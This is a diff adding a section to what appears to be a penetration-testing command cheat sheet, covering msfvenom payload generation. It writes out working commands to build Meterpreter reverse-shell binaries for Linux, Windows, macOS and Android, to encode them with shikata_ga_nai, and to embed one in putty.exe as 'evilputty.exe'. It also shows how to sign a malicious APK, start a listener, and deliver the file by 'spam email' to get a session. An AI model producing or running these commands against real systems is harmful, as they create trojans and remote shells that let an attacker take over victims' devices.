@@ -393,6 +393,75 @@ whois secmaniac.net
 msfvenom -p android/meterpreter/reverse_tcp  LHOST=192.168.0.110 LPORT=4444 R               # payload as raw input
 
 
+# MSFVENOM Basic Syntax
+#-------------------------------------------------------------------------------
+msfvenom [options] <var=value>
+#Payloads list
+msfvenom -l
+msfvenom --list all
+msfvenom --list archs        # architectura, tty, x64, java, x86, c86_64
+msfvenom --list platforms    # android,aple_ios,cisco,firefox,javascript,unix,r
+msfvenom --list payloads
+msfvenom --list encoders     # cmd/powershell_base64 or x86/shikata_ga_nai
+
+#Creating a Payload
+$ msfvenom -p [payload] LHOST=[listeninghost] LPORT=[listeningport]
+# Format Options (Specified with -f) - Executable formats
+msfvenom --list formats
+#asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, vba, vba-exe, vbs, war
+#Transform formats
+
+#bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
+#Generate binary Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL IP> LPORT=<LOCAL PORT> -f elf > shell.elf
+#Generate binary Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL IP> LPORT=<LOCAL PORT> -f exe -o shell.exe
+#Generate binary MAC
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LOCAL IP> LPORT=<LOCAL PORT> -f macho > shell.macho
+#Web Payloads
+#Check payload options
+$ msfvenom -p [payload] --payload-options
+#Encoding a Payload
+$ msfvenom -p [payload] -e [encoder] -f [formattype] -i [iteration] <var=value> > outputfile
+#Encoders Example
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.40 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
+#Example Remove Bad Characters
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -b ‘\x00′ -f exe -o payload.exe
+#Creating a Payload using a template
+msfvenom -p [payload] <var=value> -x [template] -f [formattype] > outputfile
+#Example Creating executable payload using putty.exe as template
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -x putty.exe -f exe > evilputty.exe
+
+# Android msfvenom
+#------------------------------------------------------------------------------
+# https://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/#gref
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=4444 R > ~/Desktop/pentest.apk
+# Android devices only install signed .apk files
+# To sign the apk file locally use these commands:
+keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+# First name: Android; organization unit Google Locality: IL Province: NY country code: US
+#jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore APPNAME.apk aliasname
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore ~/Desktop/pentest.apk pentest
+jarsigner -verify -verbose -certs ~/Desktop/pentest.apk
+# install zipalign -> vefifying the .apk
+apt-get install zipalign
+zipalign -v 4 APPNAME.apk NEWAPPNAME.apk
+zipalign -v 4 ~/Desktop/pentest.apk ~/Desktop/android.apk
+# showing apk file
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.0.2.5
+set LPORT 4444
+exploit              # run exploit and start to listening to the android
+# transfer file to android or android emulator
+# download from: https://code.google.com/archive/p/android-x86/downloads
+# spam email
+# run and install .apk file
+meterpreter>sysinfo                       # we got meterpreter session
+
+
 # MSFconsole
 #------------------------------------------------------------------------------
 hosts -c address,os_name -S Linux -R
